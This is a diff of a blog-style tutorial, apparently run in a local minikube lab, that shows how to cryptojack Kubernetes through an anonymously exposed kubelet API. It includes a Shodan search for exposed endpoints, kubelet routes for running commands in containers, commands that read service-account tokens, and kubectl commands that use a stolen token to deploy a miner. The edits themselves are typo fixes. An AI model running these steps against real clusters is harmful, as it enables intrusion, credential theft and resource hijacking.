@@ -26,7 +26,7 @@ In the steps below you can see we are manually configuring the kubelet API to al
 curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_latest_amd64.deb
 sudo dpkg -i minikube_latest_amd64.deb
 
-# Start local cluster and deploy a pod with a service account
+# Start the local cluster and deploy a pod with a service account
 minikube start  \
 --extra-config=kubelet.anonymous-auth=true \
 --extra-config=kubelet.authorization-mode=AlwaysAllow \
@@ -35,7 +35,7 @@ minikube start  \
 # Get IP of the cluster
 kubectl cluster-info
 
-# When done delete cluster 
+# When done delete the cluster 
 minikube delete --all
 ```
 
@@ -46,7 +46,7 @@ What is the Kubelet API? This is the API that runs on the Kubernetes worker node
 ![api.png](https://cdn.ruse.tech/imgs/kubernetes-cryptojacking/diagram.png)
 image via CyberArk
 
-Looking up `port:10250 ssl:true` on Shodan yields ~109K publicly exposed endpoints (does not mean unauthenticated). There is a tool https://github.com/averonesis/kubolt which automates searching of Shodan and test of endpoints.
+Looking up `port:10250 ssl:true` on Shodan yields ~109K publicly exposed endpoints (does not mean unauthenticated). There is a tool https://github.com/averonesis/kubolt which automates searching of Shodan and testing of endpoints.
 
 ![api.png](https://cdn.ruse.tech/imgs/kubernetes-cryptojacking/shodan.png)
 
@@ -55,7 +55,7 @@ Looking up `port:10250 ssl:true` on Shodan yields ~109K publicly exposed endpoin
 
 We can find the IP of our nodes with `kubectl cluster-info` because this is minikube we will only have one node.
 
-In the browser navigate to `https://172.17.0.2:10250/runningpods/` and see we can get some metadata from the API. This is an indication we have anon access to the kubelet API. Note visiting `https://172.17.0.2:10250/` will always return a 404  regardless of authentication.
+In the browser navigate to `https://172.17.0.2:10250/runningpods/` and see if we can get some metadata from the API. This is an indication we have anonymous access to the kubelet API. Note visiting `https://172.17.0.2:10250/` will always return a 404  regardless of authentication.
 
 
 
@@ -72,8 +72,8 @@ Kubelet is an undocumented API but in the CyberArk blog, they provided us with s
 Route | Desc | Example 
 ------ | ------ | ------
 /pods   | list running pods on worker node | GET /pods
-/run	| Run command on exisiting container | POST /run/{namespace}/{podID}/{containerName} Body: {command}
-/exec	| Run command using stream			| GET  /exec/{podNamespace}/{podID}/{containerName}?command={command}
+/run  | Run command on exisiting container | POST /run/{namespace}/{podID}/{containerName} Body: {command}
+/exec | Run command using stream      | GET  /exec/{podNamespace}/{podID}/{containerName}?command={command}
 
 
 ## Understanding Service Accounts 
@@ -98,7 +98,7 @@ items:
     kind: ServiceAccount
     metadata:
       name: ruse-sa
-	  
+    
   # Create a cluster role
   - apiVersion: rbac.authorization.k8s.io/v1
     kind: ClusterRole
@@ -141,7 +141,7 @@ items:
           - "sleep 1000"
 ```
 
-Let us take a sanity check here and play with this service account. Feel free to skip over this as it is not part of the attack. Let us exec onto the pod using our kubectl profile setup by minikube. `kubectl exec -it my-pod bash`. Now we can add the credentials file to our environment vars and curl the API. You should see some JSON returned back. This lets us know we are using the service account! Now we are comfortable with the concept of service accounts we can return to the attack narrative.
+Let us take a sanity check here and play with this service account. Feel free to skip over this as it is not part of the attack. Let us exec onto the pod using our kubectl profile setup by minikube. `kubectl exec -it my-pod bash`. Now we can add the credentials file to our environment vars and curl the API. You should see some JSON returned. This lets us know we are using the service account! Now we are comfortable with the concept of service accounts we can return to the attack narrative.
 
 ```bash
 CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
@@ -185,7 +185,7 @@ TOKEN=<TOKEN>
 kubectl --insecure-skip-tls-verify=true  \
           --server="https://172.17.0.2:8443"   \
           --token="$TOKEN" \
-		  auth can-i create deployments
+      auth can-i create deployments
 ```
 
 We are authenticated! You can enumerate your service account permissions using `kubectl can-i <verb> <resource>`. The permissions we want for our cryptojacker is `create deployments`
@@ -265,7 +265,7 @@ Using our gained access we run a single command.
 kubectl --insecure-skip-tls-verify=true  \
           --server="https://172.17.0.2:8443"   \
           --token="$TOKEN"  \
-		  apply -f miner.yaml
+      apply -f miner.yaml
 ```
 
 
@@ -277,8 +277,8 @@ You can easily remove these miners with the following command.
 kubectl --insecure-skip-tls-verify=true  \
           --server="https://172.17.0.2:8443"   \
           --token="$TOKEN"  \
-		  remove -f crypto.yaml
-		  
+      remove -f crypto.yaml
+      
 # Tear down the cluster
 minikube delete --all
 ```
